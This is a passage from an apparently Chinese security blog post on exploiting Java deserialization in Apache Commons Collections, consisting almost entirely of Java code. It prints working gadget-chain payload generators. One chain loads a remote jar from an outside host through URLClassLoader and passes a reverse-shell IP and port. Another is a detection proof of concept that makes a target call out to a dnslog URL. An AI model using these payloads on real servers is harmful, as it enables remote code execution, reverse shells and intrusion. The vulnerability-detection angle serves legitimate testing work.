    return handler;
    }
    public static Constructor getFirstCtor(final String name)
    throws Exception {
    final Constructor ctor = Class.forName(name)
    .getDeclaredConstructors()[0];
    ctor.setAccessible(true);
    return ctor;
    }
    public static Field getField(final Class clazz, final String fieldName)
    throws Exception {
    Field field = clazz.getDeclaredField(fieldName);
    if (field == null && clazz.getSuperclass() != null) {
    field = getField(clazz.getSuperclass(), fieldName);
    }
    field.setAccessible(true);
    return field;
    }
    public static void setFieldValue(final Object obj, final String fieldName,
    final Object value) throws Exception {
    final Field field = getField(obj.getClass(), fieldName);
    field.set(obj, value);
    }
    public static void main(final String[] args) throws Exception {
    final Object objBefore = CommonsCollections1.class.newInstance()
    .getObject("10.18.180.34:8080");
    //deserialize(serialize(objBefore));
    File f = new File("/Users/iswin/Downloads/payloadsfinal.bin");
    ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
    out.writeObject(objBefore);
    out.flush();
    out.close();
    }
    }
**效果  
**
[](http://www.iswin.org/attach/reverse.png)
****
**TransformedMap的实现方式**
直接上代码
    import java.io.File;
    import java.io.FileInputStream;
    import java.io.FileNotFoundException;
    import java.io.FileOutputStream;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.util.HashMap;
    import java.util.Map;
    import java.util.Map.Entry;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    /**
     * @ClassName: Main.java
     * @Description: TODO
     * @author iswin
     * @email PI:EMAIL
     * @Date 2015年11月8日 下午12:12:13
     */
    public class Main {
    public static Object Reverse_Payload(String ip, int port) throws Exception {
    final Transformer[] transforms = new Transformer[] {
    new ConstantTransformer(java.net.URLClassLoader.class),
    // getConstructor class.class classname
    new InvokerTransformer("getConstructor",
    new Class[] { Class[].class },
    new Object[] { new Class[] { java.net.URL[].class } }),
    // newinstance string http://www.iswin.org/attach/iswin.jar
    new InvokerTransformer(
    "newInstance",
    new Class[] { Object[].class },
    new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
    "http://www.iswin.org/attach/iswin.jar") } } }),
    // loadClass String.class R
    new InvokerTransformer("loadClass",
    new Class[] { String.class }, new Object[] { "R" }),
    // set the target reverse ip and port
    new InvokerTransformer("getConstructor",
    new Class[] { Class[].class },
    new Object[] { new Class[] { String.class } }),
    // invoke
    new InvokerTransformer("newInstance",
    new Class[] { Object[].class },
    new Object[] { new String[] { ip + ":" + port } }),
    new ConstantTransformer(1) };
    Transformer transformerChain = new ChainedTransformer(transforms);
    Map innermap = new HashMap();
    innermap.put("value", "value");
    Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
    Class cls = Class
    .forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
    ctor.setAccessible(true);
    Object instance = ctor.newInstance(Retention.class, outmap);
    return instance;
    }
    public static void main(String[] args) throws Exception {
    GeneratePayload(Reverse_Payload("146.185.182.237", 8090),
    "/Users/iswin/Downloads/test.bin");
    }
    public static void GeneratePayload(Object instance, String file)
    throws Exception {
    File f = new File(file);
    ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
    out.writeObject(instance);
    out.flush();
    out.close();
    }
    public static void payloadTest(String file) throws Exception {
    // 这里为测试上面的tansform是否会触发payload
    // Map.Entry onlyElement =(Entry) outmap.entrySet().iterator().next();
    // onlyElement.setValue("foobar");
    ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
    in.readObject();
    in.close();
    }
    }
**漏洞检测?  
**
这里提供一个poc供大家进行检测,其实就是发送一个http请求到指定ip,然后参数中带有特定特征来判断是否存在漏洞,直接观察日志就可以了。
    package iswin;
    import java.io.File;
    import java.io.FileOutputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    public class CommonsCollections1 {
    public InvocationHandler getObject(final String ip) throws Exception {
    final Transformer transformerChain = new ChainedTransformer(
    new Transformer[] { new ConstantTransformer(1) });
    final Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(java.net.URL.class),
    new InvokerTransformer("getConstructor",
    new Class[] { Class[].class },
    new Object[] { new Class[] { String.class } }),
    new InvokerTransformer("newInstance",
    new Class[] { Object[].class },
    new Object[] { new String[] { ip } }),
    new InvokerTransformer("openStream", new Class[] {},
    new Object[] {}), new ConstantTransformer(1) };
    // final Map innerMap = new HashMap();
    //
    // final Map lazyMap = LazyMap.decorate(new HashMap(),
    // transformerChain);
    // this will generate a
    // AnnotationInvocationHandler(Override.class,lazymap) invocationhandler
    InvocationHandler invo = (InvocationHandler) getFirstCtor(
    "sun.reflect.annotation.AnnotationInvocationHandler")
    .newInstance(Override.class,
    LazyMap.decorate(new HashMap(), transformerChain));
    final Map mapProxy = Map.class.cast(Proxy.newProxyInstance(this
    .getClass().getClassLoader(), new Class[] { Map.class }, invo));
    final InvocationHandler handler = (InvocationHandler) getFirstCtor(
    "sun.reflect.annotation.AnnotationInvocationHandler")
    .newInstance(Override.class, mapProxy);
    setFieldValue(transformerChain, "iTransformers", transformers);
    return handler;
    }
    public static Constructor getFirstCtor(final String name)
    throws Exception {
    final Constructor ctor = Class.forName(name)
    .getDeclaredConstructors()[0];
    ctor.setAccessible(true);
    return ctor;
    }
    public static Field getField(final Class clazz, final String fieldName)
    throws Exception {
    Field field = clazz.getDeclaredField(fieldName);
    if (field == null && clazz.getSuperclass() != null) {
    field = getField(clazz.getSuperclass(), fieldName);
    }
    field.setAccessible(true);
    return field;
    }
    public static void setFieldValue(final Object obj, final String fieldName,
    final Object value) throws Exception {
    final Field field = getField(obj.getClass(), fieldName);
    field.set(obj, value);
    }
    public static void main(final String[] args) throws Exception {
    final Object objBefore = CommonsCollections1.class.newInstance()
    .getObject("http://abc.333d61.dnslog.info/tangscan/iswin.jpg");
    File f = new File("/Users/iswin/Downloads/hello.bin");
    ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
    out.writeObject(objBefore);
    out.flush();
    out.close();
    // Serializables.deserialize(Serializables.serialize(objBefore));
    }
    }
****
**参考资料  
**
[1] :
[2] :[http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jboss](http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jboss)